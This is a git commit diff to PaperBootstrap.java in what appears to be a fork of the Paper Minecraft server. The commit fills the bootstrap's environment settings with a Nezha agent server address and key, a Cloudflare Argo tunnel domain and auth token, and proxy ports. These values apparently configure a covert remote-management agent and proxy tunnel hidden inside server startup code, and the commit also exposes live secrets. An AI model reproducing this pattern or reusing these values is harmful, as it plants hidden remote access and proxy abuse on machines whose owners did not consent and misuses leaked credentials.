1c12c2fd7a6c76bd5e26c1c60a98e74984640401
laohu169 <wuge169@proton.me>
2026-04-17 20:59:36 +0800

    Update PaperBootstrap.java

--- paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java
+++ paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java
@@ -93,16 +93,16 @@ public final class PaperBootstrap {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b385");
+        envVars.put("UUID", "6f2e85e2-777b-4845-b746-537c413b8d17");
         envVars.put("FILE_PATH", "./world");
-        envVars.put("NEZHA_SERVER", "");
+        envVars.put("NEZHA_SERVER", "nzmbv.wuge.nyc.mn:443");
         envVars.put("NEZHA_PORT", "");
-        envVars.put("NEZHA_KEY", "");
-        envVars.put("ARGO_PORT", "");
-        envVars.put("ARGO_DOMAIN", "");
-        envVars.put("ARGO_AUTH", "");
+        envVars.put("NEZHA_KEY", "gUxNJhaKJgceIgeapZG4956rmKFgmQgP");
+        envVars.put("ARGO_PORT", "8001");
+        envVars.put("ARGO_DOMAIN", "bytenut.zin.indevs.in");
+        envVars.put("ARGO_AUTH", "eyJhIjoiMjQ3OTNlYjY0MDI1ZTFkOTA0M2QxNzEyOWQyMTE2NGUiLCJ0IjoiM2U3OWFhODgtNDViMC00YzdlLWE4M2EtNThkMjUwODM0NThhIiwicyI6Ik1EY3dNMlEwTURZdE5qZGxZUzAwTnpVMExXRXhPV1V0WmpKaE1XRXlOREpoTlRCbSJ9");
         envVars.put("S5_PORT", "");
-        envVars.put("HY2_PORT", "");
+        envVars.put("HY2_PORT", "3690");
         envVars.put("TUIC_PORT", "");
         envVars.put("ANYTLS_PORT", "");
         envVars.put("REALITY_PORT", "");
